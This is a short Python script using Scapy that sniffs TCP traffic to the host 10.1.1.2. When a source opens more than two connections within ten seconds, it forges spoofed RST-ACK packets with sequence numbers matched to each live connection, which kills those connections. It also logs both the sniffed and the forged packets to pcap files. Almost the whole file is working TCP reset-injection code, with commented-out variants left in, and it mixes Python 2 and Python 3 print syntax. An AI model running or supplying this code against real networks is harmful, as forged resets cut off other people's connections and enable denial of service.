from scapy.all import *
import time


def spoof(pkt):
    global seconds_live, seconds_ref
    global connection_list
    global connection_packets
    seconds_live = time.time()
    if  seconds_live - seconds_ref < 10:
        key = pkt[IP].src
        key2 = key+":"+str(pkt[IP].sport)
        if key not in connection_list.keys():
            connection_list.setdefault(key,[])
            connection_list[key].append(pkt[IP].sport)
            connection_packets[key2] = pkt;
        else: 
            connection_list[key].append(pkt[IP].sport)
            connection_packets[key2]=pkt
        temp = set(connection_list[key])
        connection_list[key] = list(temp)
        for S_IP in connection_list.keys():
            if len(connection_list[S_IP]) > 2:
                for port in connection_list[S_IP]:
                    
                    key2 = S_IP+":"+str(port)
                    packet = connection_packets.get(key2)
                    
                    #IP_Packet = IP(src= packet[IP].dst, dst=packet[IP].src)
                    IP_Packet = IP(src= packet[IP].dst, dst=packet[IP].src)
                    #IP_Packet2 = IP(src=S_IP , dst ='10.1.1.2')
                    #max_seq = packet[TCP].ack + 10 * 512
                    #seqs = range(packet[TCP].ack, max_seq, int(512/2))
                    #TCP_Packet = TCP(sport = packet[TCP].dport , dport = packet[TCP].sport, flags='RA', seq = 1337, ack = 1337) #seq = ack + length of prev packet
                    TCP_Packet = TCP(sport = packet[TCP].dport , dport = packet[TCP].sport, flags='RA', seq = packet[TCP].ack, ack = packet[TCP].seq + len(packet[TCP].payload)) #seq = ack + length of prev packet
                    #TCP_Packet2 = TCP(sport =port, dport=5201,flags='R')  
                    reset_packet = IP_Packet/TCP_Packet
                    #reset_packet2 = IP_Packet2/TCP_Packet2
                    print (len(packet[TCP].payload))
                    send(reset_packet)
                    wrpcap('reset_packets.pcap', reset_packet, append=True)
                    #send(reset_packet2)
        
    else:
        seconds_ref = time.time()
        connection_list.clear()
        connection_packets.clear()





        print connection_list
        print connection_packets

    #print(pkt.show())
    wrpcap('output.pcap',pkt,append=True)



seconds_ref = time.time()
seconds_live = time.time()
#print("Starting sniffer")
timer_done = False
connection_list = {}
connection_packets = {}
pkt = sniff(filter='tcp and tcp[tcpflags] & tcp-push !=0 and tcp[tcpflags] & tcp-ack != 0 and dst host 10.1.1.2', prn=spoof)
